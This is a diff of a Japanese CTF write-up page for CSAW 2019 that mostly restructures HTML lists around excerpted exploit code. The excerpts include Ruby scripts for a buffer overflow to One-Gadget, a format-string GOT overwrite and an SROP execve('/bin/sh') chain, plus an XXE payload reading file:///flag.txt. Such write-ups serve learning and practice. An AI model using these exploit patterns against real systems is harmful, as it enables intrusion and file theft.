@@ -113,8 +113,8 @@
 
 <ul>
 <li>シンプルなBOFでIPが奪える問題</li>
-
-<li><p>libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う</p>
+<li>libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う</li>
+</ul>
 
 <pre><code class="language-ruby">#!/usr/bin/env ruby
 # coding: ascii-8bit
@@ -132,9 +132,10 @@ payload = &quot;A&quot; * 40
 payload &lt;&lt; p64(libc_base + 0x4f322)
 z.sendline(payload)
 z.interact
-</code></pre></li>
+</code></pre>
 
-<li><p><strong>flag{baby_boi_dodooo_doo_doo_dooo}</strong></p></li>
+<ul>
+<li><strong>flag{baby_boi_dodooo_doo_doo_dooo}</strong></li>
 </ul>
 
 <h3 id="got-milk-50pt">GOT Milk? (50pt)</h3>
@@ -142,8 +143,8 @@ z.interact
 <ul>
 <li>独自の共有オブジェクトとバイナリが配られる</li>
 <li><code>set LD_LIBRARY_PATH ./</code> でカレントディレクトリの共有オブジェクトを見るようにする</li>
-
-<li><p>FSBがあるので、それを使ってGOT Overwriteする</p>
+<li>FSBがあるので、それを使ってGOT Overwriteする</li>
+</ul>
 
 <pre><code class="language-ruby">#!/usr/bin/env ruby
 # coding: ascii-8bit
@@ -159,22 +160,24 @@ payload = fmt.payload(7) # index of argument
 puts z.recvuntil(&quot;? &quot;)
 z.sendline(payload)
 puts z.recv
-</code></pre></li>
+</code></pre>
 
-<li><p><strong>flag{y0u_g00000t_mi1k_4_M3!?}</strong></p></li>
+<ul>
+<li><strong>flag{y0u_g00000t_mi1k_4_M3!?}</strong></li>
 </ul>
 
 <h3 id="small-boi-100pt">small_boi (100pt)</h3>
 
 <ul>
 <li>statically linked でstrippedな小さなバイナリが与えられる</li>
-
-<li><p>sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> を実行する</p>
+<li>sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> を実行する
 
 <ul>
 <li>SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃</li>
-
-<li><p>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる</p>
+<li>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる
+<br /></li>
+</ul></li>
+</ul>
 
 <pre><code class="language-ruby">#!/usr/bin/env ruby
 # coding: ascii-8bit
@@ -204,10 +207,10 @@ payload &lt;&lt; p64(0x0) * 5 # err ~ union
 payload &lt;&lt; p64(0x0) * 8 # reserved[8]
 z.sendline payload
 z.interact
-</code></pre></li>
-</ul></li>
+</code></pre>
 
-<li><p><strong>flag{sigrop_pop_pop_pop}</strong></p></li>
+<ul>
+<li><strong>flag{sigrop_pop_pop_pop}</strong></li>
 </ul>
 
 <h3 id="traveller">traveller</h3>
@@ -320,23 +323,26 @@ end
 <ul>
 <li>試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい</li>
 </ul></li>
-<li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする
-<code>xml
-&lt;?xml version=&quot;1.0&quot;?&gt;
+<li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする</li>
+</ul>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE root[
 &lt;!ENTITY pass SYSTEM &quot;file:///flag.txt&quot;&gt;
 ]&gt;
 &lt;users&gt;
-&lt;user&gt;
-&lt;username&gt;alice2&lt;/username&gt;
-&lt;password&gt;passwd1&lt;/password&gt;
-&lt;name&gt;Alice2&lt;/name&gt;
-&lt;email&gt;alice2@fakesite.com&lt;/email&gt;
-&lt;group&gt;CSAW2019&lt;/group&gt;
-&lt;intro&gt;&amp;pass;&lt;/intro&gt;
-&lt;/user&gt;
+  &lt;user&gt;
+    &lt;username&gt;alice2&lt;/username&gt;
+    &lt;password&gt;passwd1&lt;/password&gt;
+    &lt;name&gt;Alice2&lt;/name&gt;
+    &lt;email&gt;alice2@fakesite.com&lt;/email&gt;
+    &lt;group&gt;CSAW2019&lt;/group&gt;
+    &lt;intro&gt;&amp;pass;&lt;/intro&gt;
+  &lt;/user&gt;
 &lt;/users&gt;
-</code></li>
+</code></pre>
+
+<ul>
 <li><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></li>
 </ul>
 
